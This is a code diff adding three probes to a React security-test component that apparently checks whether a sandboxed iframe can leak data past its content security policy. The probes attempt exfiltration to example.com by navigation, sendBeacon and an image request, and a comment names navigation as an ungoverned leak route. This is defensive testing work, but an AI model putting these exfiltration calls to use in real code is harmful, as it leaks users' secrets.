@@ -191,6 +191,9 @@ export default function SecurityProbe({ label, onRun }) {
   const [importStatus, setImportStatus] = useState("not run");
   const [parentStatus, setParentStatus] = useState("not run");
   const [actionStatus, setActionStatus] = useState("not run");
+  const [navigateStatus, setNavigateStatus] = useState("not run");
+  const [beaconStatus, setBeaconStatus] = useState("not run");
+  const [imageStatus, setImageStatus] = useState("not run");
 
   async function probeFetch() {
     try {
@@ -219,6 +222,33 @@ export default function SecurityProbe({ label, onRun }) {
     }
   }
 
+  // Exfiltration by navigating the jail frame itself: governed by neither
+  // connect-src nor img-src nor the sandbox's form/popup flags.
+  function probeNavigate() {
+    try {
+      location.href = "https://example.com/nav-exfil?secret=" + encodeURIComponent(label);
+      setNavigateStatus("navigation attempted");
+    } catch {
+      setNavigateStatus("FAILURE (blocked)");
+    }
+  }
+
+  function probeBeacon() {
+    try {
+      const ok = navigator.sendBeacon("https://example.com/beacon", "secret");
+      setBeaconStatus(ok ? "UNEXPECTED SUCCESS" : "FAILURE (CSP)");
+    } catch {
+      setBeaconStatus("FAILURE (CSP)");
+    }
+  }
+
+  function probeImage() {
+    const img = new Image();
+    img.onload = () => setImageStatus("UNEXPECTED SUCCESS");
+    img.onerror = () => setImageStatus("FAILURE (CSP)");
+    img.src = "https://example.com/pixel.png?secret=1";
+  }
+
   async function dispatch() {
     await onRun();
     setActionStatus("delivered");
@@ -234,6 +264,12 @@ export default function SecurityProbe({ label, onRun }) {
     <output id="parent-status">parent: {parentStatus}</output>
     <button type="button" onClick={dispatch}>Dispatch action</button>
     <output id="action-status">action: {actionStatus}</output>
+    <button type="button" onClick={probeNavigate}>Probe navigate</button>
+    <output id="navigate-status">navigate: {navigateStatus}</output>
+    <button type="button" onClick={probeBeacon}>Probe beacon</button>
+    <output id="beacon-status">beacon: {beaconStatus}</output>
+    <button type="button" onClick={probeImage}>Probe image</button>
+    <output id="image-status">image: {imageStatus}</output>
   </section>;
 }
 `;
